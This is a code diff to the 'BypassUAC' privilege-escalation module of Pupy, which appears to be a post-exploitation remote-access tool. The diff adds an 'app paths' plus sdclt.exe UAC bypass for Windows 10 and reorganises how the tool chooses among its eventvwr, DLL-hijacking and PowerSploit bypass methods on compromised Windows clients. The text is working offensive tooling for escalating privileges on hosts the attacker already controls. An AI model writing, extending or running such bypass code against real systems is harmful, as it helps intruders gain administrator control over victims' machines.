@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 #Author: @bobsecq
 #Contributor(s):
 
@@ -13,11 +13,11 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 @config(compat="windows", category="privesc")
 class BypassUAC(PupyModule):
     """try to bypass UAC """
-    dependencies=["psutil", "pupwinutils.processes", "pupwinutils.security"]
-    
+    dependencies=['pupwinutils.processes', 'pupwinutils.security', 'powershell']
+
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
-        self.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "dll_hijacking"], default=None, help="Default: the technic will be choosen for you. 'dll_hijacking' for wind7-8.1 and 'eventvwr' for wind7-10.")
+        self.arg_parser.add_argument('-m', dest='method', choices=["appPaths","eventvwr", "dll_hijacking"], default=None, help="By default, the method will be choosen for you: 'eventvwr' for wind7-8.1 and 'appPaths' for wind10. dll_hijacking method can be used for Windows 7/2008 and Windows 8/2012")
 
     def run(self, args):
         # check if a UAC Bypass can be done
@@ -25,25 +25,31 @@ class BypassUAC(PupyModule):
             self.error('Your are not on the local administrator group.')
             return
 
-        dll_hijacking = False
-        registry_hijacking = False
+        appPathsMethod = False
+        eventvwrMethod = False
+        dllhijackingMethod = False
 
         bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
         # choose methods depending on the OS Version
         if not args.method:
             if self.client.desc['release'] == '10':
-                registry_hijacking = True
+                appPathsMethod = True
             else:
-                dll_hijacking = True
-        elif args.method == "eventvwr":     
-            registry_hijacking = True
-        else:
-            dll_hijacking = True
+                dllhijackingMethod = True
+        elif args.method == "appPaths":
+            appPathsMethod = True
+        elif args.method == "eventvwr":
+            eventvwrMethod = True
+        elif args.method == "dll_hijacking":
+            dllhijackingMethod = True
 
-        if registry_hijacking:
+        if appPathsMethod:
+            self.success("Trying to bypass UAC using the 'app paths'+'sdclt.exe' method, wind10 targets ONLY...")
+            bypassUasModule.bypassuac_through_appPaths()
+        if eventvwrMethod:
             self.success("Trying to bypass UAC using the Eventvwr method, wind7-10 targets...")
-            bypassUasModule.bypassuac_through_EventVwrBypass()
-        elif dll_hijacking:
+            bypassUasModule.bypassuac_through_eventVwrBypass()
+        if dllhijackingMethod:
             # Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
             self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
-            bypassUasModule.bypassuac_through_PowerSploitBypassUAC()
+            bypassUasModule.bypassuac_through_powerSploitBypassUAC()
